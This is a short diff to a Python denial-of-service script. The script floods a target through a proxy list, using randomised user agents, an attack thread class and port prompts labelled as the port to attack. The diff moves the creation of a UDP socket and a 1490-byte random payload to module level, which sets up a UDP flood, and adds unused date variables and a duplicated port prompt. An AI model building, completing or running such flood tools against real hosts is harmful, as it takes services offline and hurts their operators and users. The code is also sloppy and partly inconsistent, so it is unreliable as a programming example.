@@ -1,8 +1,16 @@
-
+import sys
+import os
 import random
 import socket
 import threading
 import time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
 	
 userAgents = [
 	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1"
@@ -303,7 +311,10 @@ class attacco(threading.Thread):
             except:
                 proxy = random.choice(listaproxy).split(':')
  
- 
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
  
 #Main
 print('''
@@ -326,10 +337,8 @@ host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
 in_file = open(raw_input("File Proxy ( proxy.txt ) : "),"r")
 proxyf = in_file.read()
 in_file.close()
- 
-	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        bytes = random._urandom(1490)
 
+#Port
 port=input('Port(80) : ')#Port we direct to attack
 port=input('Port(53) : ')#Port we direct to attack
 
